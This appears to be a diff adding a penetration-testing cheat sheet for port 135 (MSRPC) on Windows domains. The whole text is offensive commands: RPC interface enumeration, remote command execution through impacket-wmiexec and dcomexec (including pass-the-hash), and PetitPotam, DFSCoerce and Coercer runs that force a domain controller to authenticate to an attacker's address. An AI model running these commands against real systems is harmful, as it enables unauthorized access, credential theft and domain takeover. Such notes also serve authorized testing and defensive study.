@@ -1,0 +1,16 @@
+PORT 135 — MSRPC
+bashnmap --script msrpc-enum -p 135 target
+impacket-rpcdump DC_IP
+impacket-rpcdump DC_IP | grep -i "MS-RPRN\|MS-PAR\|MS-EFSR"
+
+# WMI exec (needs creds)
+impacket-wmiexec user:pass@target
+impacket-wmiexec -hashes :HASH user@target
+
+# DCOM exec
+impacket-dcomexec -object MMC20 user:pass@target "whoami"
+
+# Coerce auth (unauthenticated in some cases)
+python3 PetitPotam.py -u '' -p '' YOURIP DC_IP
+python3 dfscoerce.py YOURIP DC_IP
+python3 Coercer.py -t DC_IP -l YOURIP
